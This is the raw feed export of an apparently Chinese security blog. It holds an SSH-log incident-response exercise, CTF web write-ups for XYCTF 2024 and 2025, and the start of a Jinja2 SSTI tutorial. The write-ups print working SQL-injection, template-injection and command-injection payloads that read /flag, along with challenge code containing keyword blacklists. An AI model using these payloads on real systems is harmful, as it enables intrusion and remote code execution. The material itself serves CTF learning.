/var/log/auth.log.1 | grep -a &quot;Accepted password for root from&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c</span><br><span class="line">2 192.168.200.2</span><br></pre></td></tr></table></figure><p>可得：flag{192.168.200.2}</p><p>三：在ssh连接的用户名不存在时会在日志“Failed password for invalid user ”+用户名的记录于是匹配得到(就是爆破字典中字典的内容)：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 | grep -a &quot;Failed password for invalid &quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c</span><br><span class="line">      5 from</span><br><span class="line">      5 hello</span><br><span class="line">      1 test1</span><br><span class="line">      1 test2</span><br><span class="line">      1 test3</span><br><span class="line">      5 user</span><br></pre></td></tr></table></figure><p>由于 存在“ Failed password for invalid user from” 出现form其实为” “（但flag没有包含这个）,同时“root“登录时提示”Failed password for root “要各外添加。</p><p>所以答案为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;user,hello,root,test3,test2,test1&#125;</span><br></pre></td></tr></table></figure><p>四：这个是看你192.168.200.2 爆破了几次</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 | grep -a &quot;Failed password for root from&quot; | awk &#123;&#x27;if($11==&quot;192.168.200.2&quot;)print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure><p>五：<strong>后门用户</strong>是指在系统中被恶意创建或修改的用户账户，目的是为了绕过正常的安全检查和控制，以便攻击者可以随时访问系统。这种用户通常是由黑客或恶意软件创建的，用于在未来的攻击中保持对系统的访问权限。首先在日志&#x2F;var&#x2F;log&#x2F;auth.log.1</p><p>用 <code>grep</code> 命令搜索与创建用户的关键字，如 <code>new user</code>。 查看新建用户，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/log/auth.log.1 | grep -a &quot;new user&quot;</span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new user: name=test2, UID=1000, GID=1000, home=/home/test2, shell=/bin/sh</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: new user: name=debian, UID=1001, GID=1001, home=/home/debian, shell=/bin/bash</span><br></pre></td></tr></table></figure><p>登录成功的IP只有192.168.200.2，那么第二条信息肯定就不是了，那就是test2了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xyctf2025web部分wp</title>
      <link href="/2025/04/09/xyctf2025web%E9%83%A8%E5%88%86wp/"/>
      <url>/2025/04/09/xyctf2025web%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h2 id="XYCTF2025"><a href="#XYCTF2025" class="headerlink" title="XYCTF2025"></a>XYCTF2025</h2><h3 id="ezsql-手动滑稽-："><a href="#ezsql-手动滑稽-：" class="headerlink" title="ezsql(手动滑稽)："></a>ezsql(手动滑稽)：</h3><p>(真的没有想到是宽字节注入,第一次做，没有做出来，问学长要wp，我还没有复现出来，我是傻逼，现在只能复现了)</p><p>首先看见题目是sql注入漏洞，打开是让你登录平台，然后就fuzz测试过滤了空格,转义了’(所以要宽字节注入)，关键字到是没有</p><p>然后就是使用substring这个函数：</p><h4 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h4><p>SUBSTRING(str, pos, len)：</p><ul><li><code>str</code>：表示要从中提取子字符串的原始字符串。</li><li><code>pos</code>：指定子字符串的起始位置。若为正数，则从字符串的开头开始计数；若为负数，则从字符串的末尾开始计数。</li><li><code>len</code>：指定要提取的子字符串的长度。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&#x27;%09or%09substring(database()%09FROM%092%09FOR%091)=&#x27;a&#x27;%23&amp;password=1(爆库)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;%09OR%09substring((select%09table_name%09from%09information_schema.tables%09where%09table_schema=&#x27;testdb&#x27;%09limit%091%09offset%090)%09FROM%091%09FOR%091)=&#x27;a&#x27;%23&amp;password=1(爆表)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;%09OR%09case%09when%09(ascii(substring((select%09column_name%09from%09information_schema.columns%09where%09table_name=&#x27;double_check&#x27;%09limit%091)%09FROM%092%09FOR%091))=116)%09then%091%09else%090%09end=1%23&amp;password=1(爆列)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;%09OR%09case%09when%09(ascii(substring((select%09secret%09from%09double_check%09limit%091)%09FROM%092%09FOR%091))=116)%09then%091%09else%090%09end=1%23&amp;password=1</span><br></pre></td></tr></table></figure><p>然后就像这样一个一个测试，拿到：dtfrtkcc0czkoua9S</p><p>同理：这样一个个测出来账号和密码：yudeyoushang&#x2F;zhonghengyisheng，进去之后直接进行RCE就ok了</p><h3 id="ez-puzzle："><a href="#ez-puzzle：" class="headerlink" title="ez_puzzle："></a>ez_puzzle：</h3><p>这个他要你进行拼图，小游戏先查看js就行，发现不让我看，肯定有好东西，直接ctrl+shift+i查看，知道是小弹窗，js里面搜索alert就行了，发现有判断条件，将小于号改成大于号就行，然后再拼一次就行了。</p><h3 id="出题人已疯："><a href="#出题人已疯：" class="headerlink" title="出题人已疯："></a>出题人已疯：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- encoding: utf-8 -*-</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">@File    :   app.py</span><br><span class="line">@Time    :   2025/03/29 15:52:17</span><br><span class="line">@Author  :   LamentXU </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">import bottle</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">flag in /flag</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">@bottle.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return &#x27;Hello, World!&#x27;</span><br><span class="line">@bottle.route(&#x27;/attack&#x27;)</span><br><span class="line">def attack():</span><br><span class="line">    payload = bottle.request.query.get(&#x27;payload&#x27;)</span><br><span class="line">    if payload and len(payload) &lt; 25 and &#x27;open&#x27; not in payload and &#x27;\\&#x27; not in payload:</span><br><span class="line">        return bottle.template(&#x27;hello &#x27;+payload)</span><br><span class="line">    else:</span><br><span class="line">        bottle.abort(400, &#x27;Invalid payload&#x27;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    bottle.run(host=&#x27;0.0.0.0&#x27;, port=5000)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 定义/attack路径的路由</span><br><span class="line">@bottle.route(&#x27;/attack&#x27;)</span><br><span class="line">def attack():</span><br><span class="line">    # 从请求的查询参数中获取payload</span><br><span class="line">    payload = bottle.request.query.get(&#x27;payload&#x27;)</span><br><span class="line">    # 检查payload是否存在，长度是否小于25，并且不包含open和\字符</span><br><span class="line">    if payload and len(payload) &lt; 25 and &#x27;open&#x27; not in payload and &#x27;\\&#x27; not in payload:</span><br><span class="line">        # 使用bottle的模板功能返回包含payload的问候语</span><br><span class="line">        return bottle.template(&#x27;hello &#x27;+payload)</span><br><span class="line">    else:</span><br><span class="line">        # 如果条件不满足，返回400错误</span><br><span class="line">        bottle.abort(400, &#x27;Invalid payload&#x27;)</span><br></pre></td></tr></table></figure><p>也就是说</p><p>需要尝试构造出小于25，并且不包含open和\字符的有效负载或者找到一种方式绕过小于25的限制(不过他是bottle)</p><p>经过测试发现可以使用unicode绕过，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%7b%7b%ba%70%65%6e%28%27%2f%66%6c%61%67%27%29%2e%72%65%61%64%28%29%7d%7d</span><br></pre></td></tr></table></figure><p>不过o可以使用%ba进行绕过(用斜体绕过，nb)</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复现xyctf2024</title>
      <link href="/2025/04/07/%E5%A4%8D%E7%8E%B0xyctf2024/"/>
      <url>/2025/04/07/%E5%A4%8D%E7%8E%B0xyctf2024/</url>
      
        <content type="html"><![CDATA[<h2 id="XYCTF"><a href="#XYCTF" class="headerlink" title="XYCTF:"></a>XYCTF:</h2><h3 id="EZhttp"><a href="#EZhttp" class="headerlink" title="EZhttp:"></a>EZhttp:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进行dirsearch查看有没有其他东西；发现robots.txt文件，然后一步一步进行，发现账号和密码</span><br><span class="line"></span><br><span class="line">发现说不是yuanshen.com的不要；</span><br><span class="line"></span><br><span class="line">改referer；Referer:yuanshen.com</span><br><span class="line"></span><br><span class="line">发现说不是XYCTF的浏览器；</span><br><span class="line"></span><br><span class="line">改UA头；User-Agent: XYCTF</span><br><span class="line"></span><br><span class="line">发现不是本地用户不能访问；</span><br><span class="line"></span><br><span class="line">client-IP:127.0.0.1</span><br><span class="line"></span><br><span class="line">发现不是ymzx.qq.com的代理;</span><br><span class="line"></span><br><span class="line">改via; via:ymzx.qq.com</span><br><span class="line"></span><br><span class="line">发现想吃cookie的小饼干；</span><br><span class="line"></span><br><span class="line">改cookie为XYCTF;获得flag</span><br></pre></td></tr></table></figure><h3 id="EZMAKE"><a href="#EZMAKE" class="headerlink" title="EZMAKE:"></a>EZMAKE:</h3><p>先测试一下一些命令；然后试试新学的echo $(&lt;flag)这个命令是将flag给重定向出来然后echo出来</p><p>发现被过滤双写试试得到flag</p><h3 id="ez-Make"><a href="#ez-Make" class="headerlink" title="ez?Make:"></a>ez?Make:</h3><p>然后上面的方法用不了了；可以试试pwd查看当前的目录；然后看看cd ..可以用吗，发现可以使用；</p><p>ok了，可以cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;more [d-h][k-m][k-m][9-z][]e-h进行正则匹配</p><h3 id="εZ-¿м-Kε¿"><a href="#εZ-¿м-Kε¿" class="headerlink" title="εZ?¿м@Kε¿?:"></a>εZ?¿м@Kε¿?:</h3><p>发现&#x2F;^[$|(|)|@|[|]|{|}|&lt; | &gt;|-]+$&#x2F;只能使用这里面的符号,那flag怎么办；</p><p>应该是特殊符号表示flag测试发现$&lt;可以表示flag，然后在linux里面$()也是可以进行打印的；</p><p>然后$(&lt;$&lt;)打印flag,但是有过滤；进行双写绕过；出来flag了</p><h3 id="EZRCE"><a href="#EZRCE" class="headerlink" title="EZRCE:"></a>EZRCE:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;\\&#x27;,&#x27;\&#x27;&#x27;,&#x27;$&#x27;,&#x27;&lt;&#x27;];</span><br></pre></td></tr></table></figure><p>只能使用这个发现是0-9 然后有&lt;可以进行重定向操作；使用8进制以及bash中的string语法；</p><p>?cmd&#x3D;$’\154\163’ (ls)发现存在文件，可以使用重定向操作给flag打印出来;?cmd&#x3D;$’\143\141\164’&lt;$’\057\146\154\141\147’</p><p>(cat &lt;&#x2F;flag)</p><h3 id="EZCLASS"><a href="#EZCLASS" class="headerlink" title="EZCLASS:"></a>EZCLASS:</h3><p>发现报错可以想到异常类；new Error()-&gt;getMessage()能够获取到字符串</p><p>a&#x3D;Error&amp;b&#x3D;Error&amp;aa&#x3D;system&amp;bb&#x3D;cat &#x2F;[a-z][a-z]*&amp;c&#x3D;getMessage</p><h3 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up:"></a>warm up:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`&lt;?phpinclude &#x27;next.php&#x27;;highlight_file(__FILE__);$XYCTF = &quot;Warm up&quot;;extract($_GET);if (isset($_GET[&#x27;val1&#x27;]) &amp;&amp; isset($_GET[&#x27;val2&#x27;]) &amp;&amp; $_GET[&#x27;val1&#x27;] != $_GET[&#x27;val2&#x27;] &amp;&amp; md5($_GET[&#x27;val1&#x27;]) == md5($_GET[&#x27;val2&#x27;])) &#123;  echo &quot;ez&quot; . &quot;&lt;br&gt;&quot;;&#125; else &#123;  die(&quot;什么情况,这么基础的md5做不来&quot;);&#125;if (isset($md5) &amp;&amp; $md5 == md5($md5)) &#123;  echo &quot;ezez&quot; . &quot;&lt;br&gt;&quot;;&#125; else &#123;  die(&quot;什么情况,这么基础的md5做不来&quot;);&#125;if ($XY == $XYCTF) &#123;  if ($XY != &quot;XYCTF_550102591&quot; &amp;&amp; md5($XY) == md5(&quot;XYCTF_550102591&quot;)) &#123;    echo $level2;  &#125; else &#123;    die(&quot;什么情况,这么基础的md5做不来&quot;);  &#125;&#125; else &#123;  die(&quot;学这么久,传参不会传?&quot;);&#125;`什么情况,这么基础的md5做不来</span><br></pre></td></tr></table></figure><p>这个就是md5绕过了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?val1[]=1&amp;val2[]=2&amp;md5=0e215962017&amp;XY=0e215962017&amp;XYCTF=0e215962017</span><br></pre></td></tr></table></figure><p>首先使用数组绕过然后0e215962017这个是他是md5值等于他自己</p><p>然后访问：LLeeevvveeelll222.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`&lt;?phphighlight_file(__FILE__);if (isset($_POST[&#x27;a&#x27;]) &amp;&amp; !preg_match(&#x27;/[0-9]/&#x27;, $_POST[&#x27;a&#x27;]) &amp;&amp; intval($_POST[&#x27;a&#x27;])) &#123;  echo &quot;操作你O.o&quot;;  echo preg_replace($_GET[&#x27;a&#x27;],$_GET[&#x27;b&#x27;],$_GET[&#x27;c&#x27;]); // 我可不会像别人一样设置10来个level&#125; else &#123;  die(&quot;有点汗流浃背&quot;);&#125;`</span><br><span class="line">**Warning**: preg_match() expects parameter 2 to be string, array given in **/var/www/html/LLeeevvveeelll222.php** on line **3**</span><br><span class="line">操作你O.o</span><br><span class="line">**Warning**: preg_replace(): Empty regular expression in **/var/www/html/LLeeevvveeelll222.php** on line **5**</span><br></pre></td></tr></table></figure><p>然后数组可以绕过preg_math和preg_match </p><p>POST:a[]&#x3D;1</p><p>GET:?a&#x3D;&#x2F;1&#x2F;e&amp;b&#x3D;(想执行的命令)&amp;c&#x3D;test(结束)</p><h3 id="牢牢记住，逝者为大"><a href="#牢牢记住，逝者为大" class="headerlink" title="牢牢记住，逝者为大:"></a>牢牢记住，逝者为大:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`&lt;?phphighlight_file(__FILE__);function Kobe($cmd)&#123;  if (strlen($cmd) &gt; 13) &#123;    die(&quot;see you again~&quot;);  &#125;  if (preg_match(&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;, $cmd)) &#123;    die(&quot;肘死你&quot;);  &#125;  foreach ($_GET as $val_name =&gt; $val_val) &#123;    if (preg_match(&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;, $val_val)) &#123;      return &quot;what can i say&quot;;    &#125;  &#125;  return $cmd;&#125;$cmd = Kobe($_GET[&#x27;cmd&#x27;]);echo &quot;#man,&quot; . $cmd . &quot;,manba out&quot;;echo &quot;&lt;br&gt;&quot;;eval(&quot;#man,&quot; . $cmd . &quot;,mamba out&quot;);`#man,,manba out</span><br></pre></td></tr></table></figure><p>首先限制我们传cmd的长度要在小于13，然后过滤了一些命令</p><p>因为是单行注释，利用url编码给他添加%0a（换行符对应URL编码,接下来是执行语句，我们暂时放一边，此时要想办法让后边的不执行，因此利用URL编码添加%23即#号注释掉后边的，此时中间就可以写shell了。</p><p>长度的话可以传新的参数cmd&#x3D;%0a<code>$_GET[a]</code>;%23</p><p>这个新的参数a的话可以执行命令但是需要进行bash执行，即8进制(记得加$’’)</p><p>这里我用的是：a&#x3D;cp &#x2F;flag nn 就是将&#x2F;flag给复制下来，然后访问nn的时候会自动下载出来，然后flag就出来了，不过要记得用bash执行</p><h3 id="我是一个复读机-："><a href="#我是一个复读机-：" class="headerlink" title="我是一个复读机 ："></a>我是一个复读机 ：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import *</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line">app = flask(__name__)</span><br><span class="line">app.secret_key = &#x27;lzlcnb&#x27;  # 设置会话密钥，用于加密会话数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;get&#x27;, &#x27;post&#x27;])</span><br><span class="line">def login():</span><br><span class="line">    if request.method == &#x27;post&#x27;:</span><br><span class="line">        username = request.form[&#x27;username&#x27;]</span><br><span class="line">        password = request.form[&#x27;password&#x27;]</span><br><span class="line"></span><br><span class="line">        # 进行登录验证逻辑，如验证用户名密码是否匹配等</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        # 登录验证成功</span><br><span class="line">        if username==&#x27;admin&#x27; and password==&#x27;asdqwe&#x27;:</span><br><span class="line">            session[&#x27;username&#x27;] = username</span><br><span class="line">            return redirect(&#x27;/index&#x27;)</span><br><span class="line">  </span><br><span class="line">    return render_template(&#x27;login.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/index&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    if &#x27;username&#x27; in session:</span><br><span class="line">        try:</span><br><span class="line">            # word=request.args.get(&#x27;sentence&#x27;)</span><br><span class="line">         </span><br><span class="line">            # if word==&quot;&#123;&#123;&#125;&#125;&quot;:</span><br><span class="line">            #     word=none</span><br><span class="line">            flag=0</span><br><span class="line">            word = request.args.get(&#x27;sentence&#x27;)</span><br><span class="line">        </span><br><span class="line">            balck_array=[&#x27;[&#x27;,&#x27;]&#x27;,&#x27;_&#x27;,&#x27;config&#x27;,&#x27;url_for&#x27;,&#x27;system&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;os&#x27;,&#x27;&quot;&#x27;,&quot;&#x27;&quot;,&#x27;cat&#x27;,&#x27;system&#x27;,&#x27;eval&#x27;,&#x27;more&#x27;,&#x27;tail&#x27;,&#x27;less&#x27;,&#x27;base64&#x27;,&#x27;file&#x27;,&#x27;nc&#x27;,&#x27;python&#x27;,&#x27;exec&#x27;,&#x27;&#123;&#x27;,&#x27;&#125;&#x27;]</span><br><span class="line">            for i in balck_array:</span><br><span class="line">                if word!=none and i in word:</span><br><span class="line">                    word=&quot;what are you doing,little hacker&quot;</span><br><span class="line">                    break</span><br><span class="line">            if word is not none:</span><br><span class="line">                for i in range(len(word)):</span><br><span class="line">                    if ord(word[i])&amp;gt;128:</span><br><span class="line">                        word=&#x27;&#123;&#x27;+word[0:i]+word[i+1:]+&#x27;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">                        flag+=1</span><br><span class="line">            else:</span><br><span class="line">                word=&quot;what do you want to say&quot;</span><br><span class="line">            if flag:</span><br><span class="line">                word=&quot;我只能看懂你说的英文(＞﹏＜)&quot;+word</span><br><span class="line"></span><br><span class="line">            if &quot;&#123;&#123;&#125;&#125;&quot; in word:</span><br><span class="line">                word = word.replace(&quot;&#123;&#123;&#125;&#125;&quot;,&#x27;&#123; &#123;&#125;&#125;&#x27;)</span><br><span class="line">            html=&#x27;&#x27;&#x27;</span><br><span class="line">        &amp;lt;!doctype html&amp;gt;</span><br><span class="line">&amp;lt;html&amp;gt;</span><br><span class="line">&amp;lt;head&amp;gt;</span><br><span class="line">    &amp;lt;title&amp;gt;我是一个复读机&amp;lt;/title&amp;gt;</span><br><span class="line">    &amp;lt;style&amp;gt;</span><br><span class="line">        body &#123;&#123;</span><br><span class="line">            font-family: arial, sans-serif;</span><br><span class="line">            background-image: url(&#x27;/static/yourname.jpg&#x27;); /* 替换 &#x27;background.jpg&#x27; 为您想要设置的背景图片路径 */</span><br><span class="line">            background-size: cover;</span><br><span class="line">            background-position: center;</span><br><span class="line">            margin: 0;</span><br><span class="line">            padding: 0;</span><br><span class="line">            display: flex;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            align-items: center;</span><br><span class="line">            height: 100vh;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">        form &#123;&#123;</span><br><span class="line">            background-color: rgba(255, 255, 255, 0.8);</span><br><span class="line">            padding: 20px;</span><br><span class="line">            border-radius: 8px;</span><br><span class="line">            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);</span><br><span class="line">            width: 800px;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">        h2 &#123;&#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            color: #333;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">        label &#123;&#123;</span><br><span class="line">            display: block;</span><br><span class="line">            margin-top: 10px;</span><br><span class="line">            color: #555;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">        input[type=&quot;text&quot;],</span><br><span class="line">        input[type=&quot;password&quot;] &#123;&#123;</span><br><span class="line">            width: 100%;</span><br><span class="line">            padding: 8px;</span><br><span class="line">            margin-top: 4px;</span><br><span class="line">            border: 1px solid #ccc;</span><br><span class="line">            border-radius: 4px;</span><br><span class="line">            box-sizing: border-box;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">        input[type=&quot;submit&quot;] &#123;&#123;</span><br><span class="line">            width: 100%;</span><br><span class="line">            padding: 8px;</span><br><span class="line">            margin-top: 10px;</span><br><span class="line">            background-color: #007bff;</span><br><span class="line">            color: #fff;</span><br><span class="line">            border: none;</span><br><span class="line">            border-radius: 4px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">        input[type=&quot;submit&quot;]:hover &#123;&#123;</span><br><span class="line">            background-color: #0056b3;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">    &amp;lt;/style&amp;gt;</span><br><span class="line">&amp;lt;/head&amp;gt;</span><br><span class="line">&amp;lt;body&amp;gt;</span><br><span class="line">    &amp;lt;form action=&quot;/index&quot; method=&quot;get&quot;&amp;gt;</span><br><span class="line">        &amp;lt;h2&amp;gt;我的宝，你说什么我就说什么&amp;lt;/h2&amp;gt;</span><br><span class="line">        &amp;lt;label for=&quot;sentence&quot;&amp;gt;你想说的话&amp;lt;/label&amp;gt;</span><br><span class="line">        &amp;lt;input type=&quot;text&quot; id=&quot;sentence&quot; name=&quot;sentence&quot; required&amp;gt;</span><br><span class="line"></span><br><span class="line">        &amp;lt;input type=&quot;submit&quot; value=&quot;tell me&quot;&amp;gt;</span><br><span class="line">        &amp;lt;h2&amp;gt;&#123;&#125;&amp;lt;/h2&amp;gt;</span><br><span class="line">    &amp;lt;/form&amp;gt;</span><br><span class="line">&amp;lt;/body&amp;gt;</span><br><span class="line">&amp;lt;/html&amp;gt;&#x27;&#x27;&#x27;.format(word)</span><br><span class="line">    </span><br><span class="line">            return render_template_string(html)</span><br><span class="line">        except exception  as e:</span><br><span class="line">            return &quot;出现了一点小问题&quot;</span><br><span class="line">    else:</span><br><span class="line">        return redirect(&#x27;/&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,debug=true,port=8080)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看源码出来账号：admin&#x2F;asdqwe</p><p>然后进入复读机模式：</p><p>一眼SSTI，注意到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;、&#123;%%&#125;、_、&#x27;</span><br></pre></td></tr></table></figure><p>都被ban了，这我还注个集贸啊😡，然后试试其他的，发现当你输入特殊字符的时候会被执行为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后就使用request和|attr组合技打：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sentence=😡(()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(132)|attr(request.values.e)|attr(request.values.f)|attr(request.values.d)(request.values.g)(request.values.h)).read()😡&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;g=popen&amp;h=cat /flag</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sentence=😡lipsum|attr(request.args.glo)|attr(request.args.ge)(request.args.o)|attr(request.args.po)(request.args.cmd)|attr(request.args.re)()😡&amp;glo=__globals__&amp;ge=__getitem__&amp;o=os&amp;po=popen&amp;cmd=cat /flag&amp;re=read</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sentence=我是()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(132)|attr(request.values.e)|attr(request.values.f)|attr(request.values.d)(request.values.l)|attr(request.values.d)(request.values.k)(request.values.h)&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;l=__builtins__&amp;k=eval&amp;h=__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI漏洞</title>
      <link href="/2025/04/02/SSTI%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/04/02/SSTI%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="SSTI漏洞"><a href="#SSTI漏洞" class="headerlink" title="SSTI漏洞"></a>SSTI漏洞</h2><h3 id="服务端模板注入"><a href="#服务端模板注入" class="headerlink" title="服务端模板注入"></a>服务端模板注入</h3><p>SSTI(Server-Side Template Injection)从名字可以看出即是服务器端模板注入。比如python中的flask、php的thinkphp、java的spring等框架一般都采用MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。(这篇文章主要是记录python的)</p><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>首先要知道什么是模板，模板可以被认为是一段固定好格式，等着开发人员或者用户来填充信息的文件。通过这种方法，可以做到逻辑与视图分离，更容易、清楚且相对安全地编写前后端不同的逻辑。</p><h4 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI:"></a>SSTI:</h4><p>服务端接收攻击者的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了攻击者插入的可以破坏模板的语句，从而达到攻击者的目的。这么说可能有点抽象，我们看一下下面的python中的基于jinja2的模板渲染。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`from flask import *`</span><br><span class="line">`from jinja2 import *`</span><br><span class="line"></span><br><span class="line">`app = Flask(__name__)`</span><br><span class="line"></span><br><span class="line">`@app.route(&quot;/myan&quot;)`</span><br><span class="line"></span><br><span class="line">`def index():`</span><br><span class="line">    `name = request.args.get(&#x27;name&#x27;,&#x27;guest&#x27;)`</span><br><span class="line">    `html = &#x27;&#x27;&#x27;&lt;h3&gt; Hello %s&#x27;&#x27;&#x27;%name`</span><br><span class="line">    `return render_template_string(html)`</span><br><span class="line"></span><br><span class="line">`if __name__ == &quot;__main__&quot;:`</span><br><span class="line">        `app.run(debug=True)`</span><br></pre></td></tr></table></figure><p>运行后访问<code>http://127.0.0.1:5000/myan</code> 可以发现默认的模板解析参数为guest，从上面的python代码中我们发现服务端的逻辑是接收前端输入的name参数，然后将其返回到后端进行拼接再返回前端进行展示，当我们输入?name&#x3D;myan时可以发现前端返回结果 回显：Hello myan</p><h5 id="模板渲染函数"><a href="#模板渲染函数" class="headerlink" title="模板渲染函数"></a>模板渲染函数</h5><p>这里主要有两种模板渲染函数，render_template_string()与render_template()，其中render_template是用来渲染一个指定文件的。render_template_string()则是用来渲染字符串的。而渲染函数在渲染的时候，往往对用户输入的变量不做渲染，即：<code>&#123;&#123;&#125;&#125;</code>在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把<code>&#123;&#123;&#125;&#125;</code>包裹的内容当做变量解析替换。比如<code>&#123;&#123;2*2&#125;&#125;</code>会被解析成4。因此才有了现在的模板注入漏洞。往往变量我们使用<code>&#123;&#123;恶意代码&#125;&#125;</code>。正因为<code>&#123;&#123;&#125;&#125;</code>包裹的东西会被解析，因此我们就可以实现类似于SQL注入的漏洞。</p><h3 id="SSTI攻击方法："><a href="#SSTI攻击方法：" class="headerlink" title="SSTI攻击方法："></a>SSTI攻击方法：</h3><h4 id="继承关系："><a href="#继承关系：" class="headerlink" title="继承关系："></a>继承关系：</h4><p>这里我想先讲讲类之间的继承关系，因为在后面的攻击中用到的就是这种继承关系的不断调用最终达到一个rce的效果，这里我们就具体讲讲类的继承关系。</p><p><code>class A:pass</code></p><p><code>class B:pass</code></p><p><code>class C:pass</code></p><p><code>class 